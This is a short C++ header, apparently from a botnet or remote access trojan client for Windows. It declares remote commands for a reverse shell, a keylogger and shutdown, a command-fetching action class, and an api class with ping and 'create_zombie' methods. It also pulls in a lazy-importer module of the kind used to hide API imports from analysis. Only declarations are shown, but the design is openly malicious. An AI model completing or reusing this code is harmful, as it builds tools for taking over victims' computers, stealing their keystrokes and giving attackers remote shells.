#pragma once

#include <Windows.h>
#include <filesystem>

#include <security/modules/lazy_importer.hpp>

#define OWNER "c3ead26f-002b-4026-95c4-538c7405a9d9"
namespace vaev
{
	enum action_types
	{
		reverse_shell = 1,
		key_logger,
		shutdown
	};

	static size_t write_function(void* data, size_t size, size_t nmemb, void* userp);

	class action
	{
	private:
		std::string e_id;
		
		vaev::action_types e_type;

		std::string e_data;
	public:
		vaev::action begin();

		bool completed();

		vaev::action_types type();

		std::string id();

		std::string data();
	};

	class api
	{
	private:
		std::string id;

        bool create_zombie();
	public:
		bool ping();

        vaev::api begin();
	};
}